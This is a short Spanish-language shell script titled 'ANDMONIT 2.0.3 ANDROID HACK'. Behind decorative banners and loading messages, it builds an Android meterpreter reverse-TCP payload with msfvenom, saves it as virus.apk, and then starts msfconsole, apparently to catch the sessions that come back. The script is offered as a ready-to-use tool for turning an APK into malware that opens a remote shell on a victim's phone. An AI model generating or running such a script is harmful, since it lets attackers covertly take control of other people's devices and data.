sudo clear
figlet ANDMONIT 2.0.3
echo INICIANDO SERVICIOS:
sudo echo 	[!] INICIANDO ANDMONIT...
sleep 5
clear
figlet ANDMONIT 2.0.3
echo INICIANDO SERVICIOS:
echo 	[!] CARGANDO RECURSOS...
sleep 3
echo 	[*]ANDMONIT ANDROID HACK -By Genplat-
sleep 3
clear
figlet ANDMONIT 2.0.3
echo INICIANDO SERVICIOS:
echo 	[!] LISTO!
sleep 2
clear
figlet ANDMONIT 2.0.3
echo SERVICIOS INICIADOS CON EXITO!
sleep 1
clear
figlet ANDMONIT 2.0.3
echo [!]CREANDO APK...
cd /home/genplat/Escritorio/Virus
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > /home/genplat/Escritorio/Virus/virus.apk
echo APK CREADA CON EXITO!
echo [!]MONITOREANDO APK...
sudo msfconsole -r android.rc
clear
echo [!]SESION DE ANDMONIT FINALIZADA